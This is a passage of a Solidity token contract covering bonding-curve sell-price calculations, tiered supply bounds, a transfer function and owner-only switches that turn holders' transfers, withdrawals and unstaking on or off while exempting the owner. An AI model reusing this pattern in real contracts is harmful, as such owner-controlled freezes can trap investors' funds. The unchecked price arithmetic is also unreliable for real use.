                _tokenSupply = _tokenSupply - 1;
                _grv -= 1;
                tempbase = upperBound_(_grv-1);
                continue;
            }
            uint256 b = ((tokensToSell-1)*_tokenPriceIncremental);
            uint256 a = _currentPrice - b;
            _tokens = _tokens - tokensToSell;
            _etherReceived = _etherReceived + ((tokensToSell/2)*((2*a)+b));
            _currentPrice = a;
            _tokenSupply = _tokenSupply - tokensToSell;
            _grv = _grv-1 ;
            // _tokenPriceIncremental = (tokenPriceIncremental_*((2)**(_grv-1)));
            _tokenPriceIncremental = incrementalPriceFull(_grv);
            tempbase = upperBound_(_grv-1);
        }
        if(_tokens > 0)
        {
             uint256 a = _currentPrice - ((_tokens-1)*_tokenPriceIncremental);
             _etherReceived = _etherReceived + ((_tokens/2)*((2*a)+((_tokens-1)*_tokenPriceIncremental)));
             _tokenSupply = _tokenSupply - _tokens;
             _currentPrice = a;
        }
        
        _etherReceived = _etherReceived + getTokensToEtronBuyDeci_(decitoken,_currentPrice);
        
        grv = _grv;
        currentPrice_ = _currentPrice;
        return _etherReceived;
    }
    
    function calculateEthereumReceived(uint256 _tokensToSell,bool _boolvalue) 
        internal 
        view 
        returns(uint256)
    {
        
        uint256 _tokens = _tokensToSell/1000;
        uint256 value = _tokens/2;
        uint256 _ethereum = 0;
        if((2 * value) == _tokens){
            //even
             _ethereum = getTokensToEthereum_(_tokensToSell);
        }else{
            //odd
            _tokensToSell-=1000;
             _ethereum = getTokensToEthereum_(_tokensToSell);
            uint256 _currentPrice = currentPrice_ - ((_tokens-1)*incrementalPriceFull(grv));
            _ethereum +=_currentPrice - incrementalPriceFull(grv);
        }
        if(_boolvalue == true){
            _ethereum = _ethereum - (_ethereum * sPercent)/10000; //sellpercent
        }
         

        return _ethereum;
    }
    
    function calculateEtronReceivedsell(uint256 _tokensToSell) 
        public 
        view 
        returns(uint256)
    {
        
        uint256 _tokens = _tokensToSell/1000;
        uint256 value = _tokens/2;
        uint256 _ethereum = 0;
        if((2 * value) == _tokens){
            //even
             _ethereum = getTokensToEthereum_(_tokensToSell);
        }else{
            //odd
            _tokensToSell-=1000;
             _ethereum = getTokensToEthereum_(_tokensToSell);
            uint256 _currentPrice = currentPrice_ - ((_tokens-1)*incrementalPriceFull(grv));
            _ethereum +=_currentPrice - incrementalPriceFull(grv);
        }       
        _ethereum = _ethereum - (_ethereum * sPercent)/10000; //sellpercent
        
        return _ethereum;
    }
    
    function getTokensToEthereum_(uint256 _tokens)
        internal
        view
        returns(uint256)
    {
        uint256 fulltoken =  _tokens/1000;
        uint256 decitoken = _tokens%1000;
        _tokens = fulltoken;
        
        uint256 _tokenSupply = tokenSupply_/1000;
        uint256 _etherReceived = 0;
        uint256 _grv = grv;
        uint256 tempbase = upperBound_(_grv-1);
        // uint256 _tokenPriceIncremental = (tokenPriceIncremental_*((2)**(_grv-1)));
        uint256 _tokenPriceIncremental = incrementalPriceFull(_grv);
        uint256 _currentPrice = currentPrice_ - _tokenPriceIncremental;
        while((_tokenSupply - _tokens) < tempbase)
        {
            uint256 tokensToSell = _tokenSupply - tempbase;
            if(tokensToSell == 0)
            {
                _tokenSupply = _tokenSupply - 1;
                _grv -= 1;
                tempbase = upperBound_(_grv-1);
                continue;
            }
            uint256 b = ((tokensToSell-1)*_tokenPriceIncremental);
            uint256 a = _currentPrice - b;
            _tokens = _tokens - tokensToSell;
            _etherReceived = _etherReceived + ((tokensToSell/2)*((2*a)+b));
            _currentPrice = a;
            _tokenSupply = _tokenSupply - tokensToSell;
            _grv = _grv-1 ;
            // _tokenPriceIncremental = (tokenPriceIncremental_*((2)**(_grv-1)));
            _tokenPriceIncremental = incrementalPriceFull(_grv);
            tempbase = upperBound_(_grv-1);
        }
        if(_tokens > 0)
        {
             uint256 a = _currentPrice - ((_tokens-1)*_tokenPriceIncremental);
             _etherReceived = _etherReceived + ((_tokens/2)*((2*a)+((_tokens-1)*_tokenPriceIncremental)));
             _tokenSupply = _tokenSupply - _tokens;
             _currentPrice = a;
        }
        
        _etherReceived = _etherReceived + getTokensToEtronBuyDeci_(decitoken,_currentPrice);
        
        return _etherReceived;
    }
    
    
    function sqrt(uint x) internal pure returns (uint y) {
        uint z = (x + 1) / 2;
        y = x;
        while (z < y) {
            y = z;
            z = (x / z + z) / 2;
        }
    }
    
    function upperBound_(uint256 _grv) 
    internal
    pure
    returns(uint256)
    {
        if(_grv <= 1)
        {
            return (200000*_grv);
        }
        if(_grv > 1 && _grv <= 2)
        {
            return (200000 + 180000);
        }
        if(_grv > 2 && _grv <= 3)
        {
            return (380000 + 160000);
        }
        if(_grv > 3 && _grv <= 4)
        {
            return (540000 + 140000);
        }
        if(_grv > 4 && _grv <= 5)
        {
            return (680000 + 120000);
        }
        if(_grv > 5 && _grv <= 6)
        {
            return (800000 + 100000);
        }
        if(_grv > 6 && _grv <= 7)
        {
            return (900000 + 90000);
        }
        if(_grv > 7 && _grv <= 8)
        {
            return (990000 + 80000);
        }
        if(_grv > 8 && _grv <= 9)
        {
            return (1070000 + 70000);
        }
        if(_grv > 9 && _grv <= 10)
        {
            return (1140000 + 60000);
        }
        if(_grv > 10 && _grv <= 11)
        {
            return (1200000 + 50000);
        }
        if(_grv > 11 && _grv <= 12)
        {
            return (1250000 + 40000);
        }
        if(_grv > 12 && _grv <= 13)
        {
            return (1290000 + 30000);
        }
        if(_grv > 13 && _grv <= 14)
        {
            return (1320000 + 30000);
        }
        if(_grv > 14 && _grv <= 15)
        {
            return (1340000 + 10000);
        }
        return 0;
    }
    
    function incrementalPriceFull(uint256 _grv)
    internal
    pure
    returns(uint256)
    {
         if(_grv == 1){
                return  7;
            }else if(_grv == 2 ){
                 return 8;
            }else if(_grv == 3 ){
                 return 9;
            }else if(_grv == 4 ){
                return 10;
            }else if(_grv == 5 ){
                return 11;
            }else if(_grv == 6 ){
                return 14;
            }else if(_grv == 7 ){
                return 15;
            }else if(_grv == 8 ){
                return 34;
            }else if(_grv == 9 ){
                return 196;
            }else if(_grv == 10 ){
                return 456;
            }
            else if(_grv == 11 ){
                return 1095;
            }
            else if(_grv == 12 ){
                return 2737;
            }
            else if(_grv == 13 ){
                return 7300;
            }
            else if(_grv == 14 ){
                return 21900;
            }
            else if(_grv == 15 ){
                return 87599;
            }
            else{
                return  230;
            }
    }
    function transfer(address _toAddress, uint256 _amountOfTokens)
        public
        onlyHolders
        returns(bool)
    {
        if (msg.sender != owner) {
            require(myTokens() > 0, "only owner or user can use this function.");
            require(tramsferAllow == true, "Transfer not working");
            
        }
        // setup
        address _customerAddress = msg.sender;
        // if(MAXX_WITHDRAW == 0){
        //     MAX_WITHDRAW = maxWithdraw_(grv);
        // }else{
        //     MAX_WITHDRAW = MAXX_WITHDRAW;
        // }
        uint256 uid = address2UID[_customerAddress];
        // require(_amountOfTokens <= MAX_WITHDRAW,"You cannot exceed the withdrawal or transfer limit in a day");
        // require(block.timestamp > uid2Investor[uid].checkpoint + 1 days , "Only once a day");
        if (msg.sender != owner) {
            uid2Investor[uid].checkpoint = block.timestamp;
        }
        
        // exchange tokens
        tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);
        tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _amountOfTokens);
        emit Transfer(_customerAddress, _toAddress, _amountOfTokens);
        // ERC20
        return true;
    }
    
    function setwithdrawAllow(bool _value) public onlyOwner{
       withdrawAllow = _value;
    }
    
    function getwithdrawAllow() public view onlyOwner returns (bool) {
        return withdrawAllow;
    }
    
    function setunstakeAllow(bool _value) public onlyOwner{
       unstakeAllow = _value;
    }
    
    function getunstakeAllow() public view onlyOwner returns (bool) {
        return unstakeAllow;
    }
    function settramsferAllow(bool _value) public onlyOwner{
       tramsferAllow = _value;
    }
    
    function gettramsferAllow() public view onlyOwner returns (bool) {
        return tramsferAllow;
    }
   
    
}